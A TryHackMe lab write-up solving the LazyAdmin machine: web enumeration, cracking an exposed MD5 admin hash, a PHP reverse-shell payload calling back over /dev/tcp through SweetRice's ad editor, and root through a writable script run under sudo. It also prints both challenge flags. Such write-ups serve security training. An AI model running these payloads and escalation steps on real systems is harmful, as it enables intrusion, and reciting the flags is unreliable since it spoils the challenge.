# 🛡️ TryHackMe - LazyAdmin Write-up

## 📌 Overview

This write-up documents the methodology used to compromise the **LazyAdmin** machine on TryHackMe.  
The attack chain involved:

- Network Enumeration  
- Web Directory Bruteforcing  
- CMS Exploitation (SweetRice)  
- Privilege Escalation via Misconfigured Sudo  

---

## 🛠️ Tools Used

- Nmap  
- Gobuster  
- Netcat  
- CrackStation  
- Linux utilities  

---

## 🔍 Reconnaissance

I started with a network scan to identify open ports and services:
nmap -sC -sV <target_ip>

Findings:
Port 22 → OpenSSH 7.2p2
Port 80 → Apache 2.4.18 (Ubuntu)

Since HTTP was available, I focused on web enumeration.

🚪 Enumeration

Navigating to the web root (/) displayed the default Apache page, indicating hidden content.

Directory Bruteforcing:
gobuster dir -u http://<target_ip> -w <wordlist>
Key Finding:
/content/ → Hosted a SweetRice CMS

I performed further enumeration on this directory:

gobuster dir -u http://<target_ip>/content/ -w <wordlist>
Important Directories:
/inc
/as

🔐 Credential Discovery

Inside /inc, I found:

mysql_backup directory
SQL backup file containing database data

This file included an MD5 hashed password for the admin user.

I cracked the hash using CrackStation:

manager : Password123


💥 Exploitation

Accessed the admin panel:

/content/as

Using the credentials, I gained access to the SweetRice dashboard.

⚡ Remote Code Execution

SweetRice 1.5.1 is vulnerable to Authenticated PHP Code Injection.

Steps:
Navigate to Ads section
Create a new Ad
Insert reverse shell:
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'");
?>

Start listener:
nc -lvnp <port>
Trigger payload:
/content/inc/ads/<file>.php
Result:
Gained shell as www-data


🖥️ Shell Stabilization

To improve shell usability:

script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
🏁 User Flag

Successfully retrieved:

user.txt


🔑 Privilege Escalation

Checked sudo permissions:

sudo -l
Key Finding:
A Perl script (backup.pl) could be executed with sudo

The script executed:

/etc/copy.sh
Vulnerability:
www-data had write permission on /etc/copy.sh
🚀 Root Exploit

Modified /etc/copy.sh:

/bin/bash

Then executed:

sudo /usr/bin/perl /path/to/backup.pl
Result:
Root shell obtained
🏁 Root Flag
root.txt
🎯 Flags
User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
Root Flag: THM{6637f41d0177b6f37cb20d775124699f}
📚 Key Learnings
Importance of thorough directory enumeration
Risks of exposed backup files
Weak hashing (MD5) can be easily cracked
CMS vulnerabilities can lead to full system compromise
Misconfigured sudo permissions are critical privilege escalation vectors
